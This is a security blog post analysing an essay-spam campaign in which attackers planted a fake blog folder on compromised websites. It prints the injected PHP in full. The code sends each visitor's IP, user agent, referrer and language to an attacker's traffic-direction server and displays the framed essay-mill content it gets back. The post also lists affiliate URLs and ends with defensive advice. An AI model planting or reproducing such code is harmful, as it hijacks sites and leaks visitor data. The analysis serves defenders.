@@ -1,0 +1,92 @@
+Malicious Subdirectories Strike Again
+
+In a previous post, we illustrated how attackers were fetching information from compromised sites under their control to display spam content on other hacked websites. By adding malicious files into a directory and using the victim’s database structure, attackers were able to inject ads and promote their products.
+This time, attackers used a similar technique with a little bit more sophistication to achieve their goals.
+Essay Spam Campaign
+This technique is now being used to distribute essay spam targeted at students. This type of spam is actually quite common and we’ve seen many strategies being used to propagate it throughout the years.
+In this scenario, attackers injected a ./blog folder into the victim’s website, pretending to be a legit blog directory. However, when you try to access it in a browser, it shows an essay website that should not be there:
+Essay spam site content
+What makes it even more interesting is the fact that every time you reload the page, it shows a completely different essay website.
+Essay content after reloading
+Malicious Subdirectories
+Inside the ./blog folder there are directories full of PHP files with essay-related filenames. Those files share the same following PHP code:
+<?php error_reporting( E_ERROR ); $apiKey = '3d62404a441c24f8357d50dd66146bbc';
+$campaignId = 'CxFtyM';
+$keyword = urlencode('hXXp://infected-website[.]com/blog/path-to-file/file[.]php');
+$ua = urlencode($_SERVER['HTTP_USER_AGENT']);
+$lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
+$ip = null;
+$headers = array('HTTP_X_FORWARDED_FOR', 'HTTP_CF_CONNECTING_IP', 'HTTP_X_REAL_IP', 'REMOTE_ADDR');
+foreach ($headers as $header) {
+if (!empty($_SERVER[$header])) {
+$ip = $_SERVER[$header];
+break;
+}
+}
+if (strstr($ip, ',')) {
+$tmp = explode(',', $ip);
+if (stristr($_SERVER['HTTP_USER_AGENT'], 'mini')) {
+$ip = trim($tmp[count($tmp) - 2]);
+} else {
+$ip = trim($tmp[0]);
+}
+}
+if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+$tmp = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+$ip = trim($tmp[0]);
+} else {
+$ip = $_SERVER['REMOTE_ADDR'];
+}
+$referrer = urlencode($_SERVER['HTTP_REFERER']);
+$url = "hXXp://gotopplz[.]xyz/tds/api[.]php?action=get&api_key=$apiKey&campaign=$campaignId&ua=$ua&ip=$ip&keyword=$keyword&referrer=$referrer&lang=$lang";
+$rCURL = curl_init();
+curl_setopt($rCURL, CURLOPT_URL, $url);
+curl_setopt($rCURL, CURLOPT_HEADER, 0);
+curl_setopt($rCURL, CURLOPT_RETURNTRANSFER, 1);
+$aData = curl_exec($rCURL);
+curl_close($rCURL);
+$result = json_decode ( $aData );
+if ($result->redirect) {
+foreach($result->redirect->headers as $header) {
+header($header);
+}
+if ($result->redirect->content) {
+echo $result->redirect->content;
+exit;
+}
+}
+?>
+...
+The malicious code gathers information from the visitor, such as:
+
+User Agent
+IP Address
+Referrer
+HTTP Accept-Language
+
+The information is then sent to gotopplz[.]xyz, which returns JSON content.
+Campaign Tracking
+Before going further, it’s very important to note two variables – $apiKey and $campaignId – being sent through that link. The objective of this campaign is ultimately monetary gain, so those variables are probably used to identify the specific campaign and distribute the profits (similar to affiliate tracking).
+Here is the JSON returned by gotopplz[.]xyz:
+{"stream":{"id":0,"campaign_id":2,"url":"https:\/\/speedypaper.com\/?rt=RSTOKqCq"},
+"redirect":{"type":"frame","headers":[],"content":"<html><frameset rows=\"100%\">
+<frame src=\"hXXps:\/\/speedypaper[.]com\/?rt=RSTOKqCq\"><\/frameset><\/html>"}}
+This will get content from speedypaper[.]com/?rt=RSTOKqCq and display it on the malicious website.
+Here are some other websites that can be fetched by the script to display essay content:
+
+papercoach[.]net/?rt=bhj3CqYE
+extraessay[.]com?key_wpg=7e989c5e16fd8da4cdfa23a244128bfa
+myadmissionsessay[.]com/?pid=3322
+speedypaper[.]com/?rt=RSTOKqCq
+
+To prevent search engines from seeing the spam content, the script will return a “404 Not Found” error for user agents like Googlebot and MSNbot.
+Below the PHP we shared above, there is a full essay HTML page that will be displayed if the script cannot get the desired content from gotopplz[.]xyz. This ensures the content can be displayed even if cURL is disabled on the server.
+How to Protect Your Site
+Here are some good security practices to protect your website moving forward:
+
+Update your software. This includes your CMS (WordPress, Joomla, etc.), plugins, themes, and server software. Outdated software is the leading cause of website infections and reinfections.
+Use strong passwords. From your administrator login page to FTP users, always choose long, complex, and unique passwords for your website management accounts.
+Check your core file integrity. Malicious code is often inserted into core files. If you’re using WordPress, you can install our free security plugin which provides a core file integrity check.
+Use a Web Application Firewall. A WAF will filter all HTTP/HTTPS traffic between your server and your visitors, blocking known attacks and virtually patching your site even if you forget to update.
+
+If you believe your website has been infected and need specialized assistance in website security to clean and protect your website, let us know.
